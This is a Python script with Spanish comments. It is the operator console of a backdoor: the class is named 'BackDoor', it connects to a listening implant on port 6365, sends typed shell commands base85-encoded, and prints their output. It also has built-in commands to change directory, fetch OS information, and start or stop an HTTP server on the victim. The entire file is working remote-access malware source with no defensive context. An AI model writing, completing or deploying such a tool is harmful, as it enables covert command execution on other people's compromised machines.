#! /usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import base64
import datetime
import os
import subprocess
import sys

from http.server import BaseHTTPRequestHandler, HTTPServer

global _CodingBase85Text
global _DecodingBase85Text
global i


def _MAIN():
    i = 1

    def _CodingBase85Text(ServerConnect, text):
        data = base64.b85encode(text.encode(), pad=False)
        ServerConnect.send(data)

    def _DecodingBase85Text(ServerConnect, buff):
        try:
            data = ServerConnect.recv(int(buff)).decode()
            data = base64.b85decode(data)
            return str(data.decode())
        except ValueError:
            #print('\033[1;36mocurrio un error desconocido')
            pass
            #i = 2

    class BackDoor:

        def __init__(self):

            self.Host = '127.0.0.1'
            self.Port = 6365
            self.Green = "\033[1;32m"
            self.White = "\033[1;37m"
            self.Data = None
            self.buffer = 2048
            i = 1

            self.Client = socket.socket()
            self.Time = str(datetime.date.today())
            self.Cwd = str(os.getcwd())

        def Connection(self):
            self.Client.connect((self.Host, self.Port))
            print(_DecodingBase85Text(self.Client, 8000))

            while int(i) == 1:
                try:
                    #ruta = _DecodingBase85Text(self.Client, self.buffer)
                    command = str(input(
                        self.Green+'[*]'+"\033[1;33m{"+str(self.Cwd)+"}"+self.White+'Desmon:>> '))

                    if str(command) == 'exit':
                        _CodingBase85Text(self.Client, str('exit'))
                        self.Client.close()
                        break
                    
                    elif str(command) == '' or str(command) == ' ' or str(command) == '\n':
                        print("comando incorrecto")


                    elif str(command) == 'cd':
                        dat = str(input("ruta a la que acede: "))
                        _CodingBase85Text(self.Client, str(dat))
                        buff = _DecodingBase85Text(self.Client, 8000)
                        if buff == None:
                            buff = 800
                        else:
                            pass
                        dat = _DecodingBase85Text(self.Client, int(buff)*8)
                        print(str("ruta: " +str(dat)+" se a podido aceder correctamente."))
                        self.Cwd = str(dat)

                    elif str(command) == 'OsInfo':
                        _CodingBase85Text(self.Client, str('OsInfo'))
                        data = _DecodingBase85Text(self.Client, 8000)
                        print(str(data))

                    elif str(command) == 'cwd':
                        _CodingBase85Text(self.Client, str('cwd'))
                        self.Cwd = str(_DecodingBase85Text(self.Client, 8000))

                    elif str(command) == 'HttpServer':
                        _CodingBase85Text(self.Client, str('HttpServer'))
                        data = _DecodingBase85Text(self.Client, 8000)
                        print(str(data))

                    elif str(command) == 'CloseHttpServer':
                        _CodingBase85Text(self.Client, str('CloseHttpServer'))
                        data = _DecodingBase85Text(self.Client, 8000)
                        print(str(data))

                    elif str(command) == 'cd ..':
                        print("el comando: cd .. y sus derrivantes no estan disponibles")

                    else:

                        _CodingBase85Text(self.Client, str(command))

                        if self.buffer == None or self.buffer == 0:
                            self.buffer = 2048
                        else:
                            opert = _DecodingBase85Text(
                                self.Client, self.buffer)

                            if opert == None:
                                self.buffer = 3000
                            else:
                                pass

                            # el server manda la longitud del oput que va a enviar para definir el buffer, si tiene 10 caracteres = 10 bit a de multiplicarse por 8 para saber los bit a definir
                            self.buffer = int(self.buffer) * 8 + 50

                            if int(self.buffer) < 80000:
                                self.buffer = 100000
                            elif int(self.buffer) > 80000:
                                self.buffer = int(self.buffer) + 3000

                            # establcemos el buffer del mensaje y lo recibimos
                            data = _DecodingBase85Text(
                                self.Client, self.buffer)
                            print(str(data))
                            data = None  # restablecemos la variable data
                            self.buffer = 3000 * 8 + 50
                    
                        if sys.platform == 'linux' or sys.platform == 'linux2':
                            subprocess.getstatusoutput("clear")
                        elif sys.platform == 'win32':
                            subprocess.getstatusoutput("cls")
                        else :
                            subprocess.getstatusoutput("cls")
                        #print(_DecodingBase85Text(self.Client, 8000))

                except UnicodeDecodeError:
                    print(
                        '\033[1;36mocurrio un error de descodificaion unicode en el cliente')

    BackDoor = BackDoor()
    BackDoor.Connection()


if __name__ == "__main__":
    # while True:
    _MAIN()
